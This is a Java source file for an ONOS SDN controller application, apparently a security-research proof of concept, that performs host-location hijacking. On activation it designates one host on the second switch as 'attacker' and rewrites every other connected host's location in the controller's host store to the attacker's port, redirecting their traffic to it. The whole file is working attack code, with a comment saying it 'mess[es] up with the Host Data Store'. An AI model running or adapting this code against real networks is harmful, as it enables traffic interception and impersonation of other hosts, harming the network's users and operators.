/*
 * Copyright 2022-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author edoardottt, https://edoardottt.com/
 */

package org.edoardottt.impersonationhosttracking;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onosproject.core.CoreService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.host.HostStore;
import org.onosproject.net.Host;
import org.onosproject.net.HostId;
import org.onosproject.net.HostLocation;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.device.DeviceStore;
import org.onosproject.net.Device;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

/**
 * Impersonation Host Tracking Application.
 */
@Component(immediate = true)
public class ImpersonationHostTracking {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostStore hostStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceStore deviceStore;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.impersonationhosttracking.app",
                () -> log.info("Periscope down."));
        editHostStore();
        log.info("Started impersonationhosttracking App!");
    }

    @Deactivate
    protected void deactivate() {
        log.info("Stopped impersonationhosttracking App!");
    }

    // editHostStore mess up with the Host Data Store.
    private void editHostStore() {
        Iterable<Device> devices = deviceService.getDevices();
        List<Device> deviceList = new ArrayList<Device>();
        devices.forEach(deviceList::add);
        log.info("Impersonation Host Tracking App: Devices {}", deviceList);
        Device s2 = deviceList.get(1);
        Set<Host> hosts = hostStore.getConnectedHosts(s2.id());
        log.info("Impersonation Host Tracking App: Hosts {}", hosts.toString());
        List<Host> hostsArray = new ArrayList<>(hosts);
        List<Host> victims = new ArrayList<>();
        Host attacker = hostsArray.get(0);
        log.info("Impersonation Host Tracking App: Attacker {}", attacker.toString());
        for (Host h : hostsArray) {
            if (!h.equals(attacker)) {
                victims.add(h);
            }
        }
        log.info("Impersonation Host Tracking App: Victims {}", victims.toString());
        changeLocation(getLocations(attacker.id()).iterator().next(), victims);
        for (Host h : victims) {
            log.info("Impersonation Host Tracking App: Victim {} > new Locations {}", h.id(), getLocations(h.id()));
        }
    }

    private void changeLocation(HostLocation attacker, List<Host> victims) {
        for (Host h : victims) {
            log.info("Impersonation Host Tracking App: Targeting host {}", h);
            Set<HostLocation> oldLocation = getLocations(h.id());
            log.info("Impersonation Host Tracking App: Victim Locations {}", oldLocation);
            hostStore.appendLocation(h.id(), attacker);
            log.info("Impersonation Host Tracking App: Victim Locations {}", getLocations(h.id()));
            hostStore.removeLocation(h.id(), oldLocation.iterator().next());
            log.info("Impersonation Host Tracking App: Victim Locations {}", getLocations(h.id()));
        }
    }

    private Set<HostLocation> getLocations(HostId hID) {
        Host h = hostService.getHost(hID);
        Set<HostLocation> locations = h.locations();
        return locations;
    }
}
